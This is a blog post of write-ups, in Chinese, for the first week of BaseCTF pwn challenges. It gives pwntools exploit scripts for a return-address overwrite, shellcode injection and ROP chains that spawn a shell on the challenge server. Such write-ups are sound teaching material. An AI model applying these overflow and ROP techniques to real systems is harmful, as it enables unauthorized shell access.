---
layout: post
title: "BaseCTF-Week1"
date: 2024-7-10
tags: [pwn]
comments: true
author: gbeefee

---

###### 0x0 签到

签到题

`nc `

`cat flag`

###### 0x1 echo

用echo命令读文件

`echo "$(<flag)"`

###### 0x2 ret2text

pwn里的hellowolrd属于是，直接修改返回地址为后门函数

```
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

#io = process('./pwn')
io = remote('challenge.basectf.fun','25230')

payload = b'a'*0x20 +p64(0)+p64(0x4011BB)

io.sendline(payload)

io.interactive()
```

###### 0x3 shellcode0

也是hellowolrd级别，直接输入一段shellcode，程序会自动执行。

```
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

#io = process('./pwn')
io = remote('challenge.basectf.fun','28285')

sc = asm(shellcraft.sh())

io.sendline(sc)

io.interactive()
```

###### 0x4 我把她丢了

基础ROP，有system，有"/bin/sh"，使用ROPgadget找到各个组件，再拼到一起

```
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

#io = process('./pwn')
io = remote('challenge.basectf.fun','37429')
binsh=0x402008
system =0x40120F
pop_rdi =0x401196

payload = b'a'*0x70 +p64(0)+p64(pop_rdi)+p64(binsh)+p64(system)

io.sendlineafter(b'find her.\n',payload)

io.interactive()
```

###### 0x5 彻底失去她

基础ROP，有system，无"/bin/sh"，使用read在bss段写入"/bin/sh"，使用ROPgadget找到各个组件，再拼到一起

```
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

elf=ELF('./pwn')
io = process('./pwn')
#io = remote('challenge.basectf.fun',31322)

bss = 0x404070
system = 0x4011a5
pop_rdi = 0x401196
pop_rsi = 0x4011ad
pop_rdx = 0x401265
main_addr =0x401214
ret= 0x40101a
read_got=elf.plt['read']

payload = b'a'*10 + p64(0) +\
p64(pop_rdi) + p64(0) +\
p64(pop_rsi) + p64(bss) +\
p64(pop_rdx) + p64(0x10) +\
p64(read_got) + p64(ret) +\
p64(pop_rdi) + p64(bss) + p64(system)

io.sendafter(b'name?\n', payload)
io.send(b'/bin/sh\x00')  # 发送实际的 shell 命令

io.interactive()
```

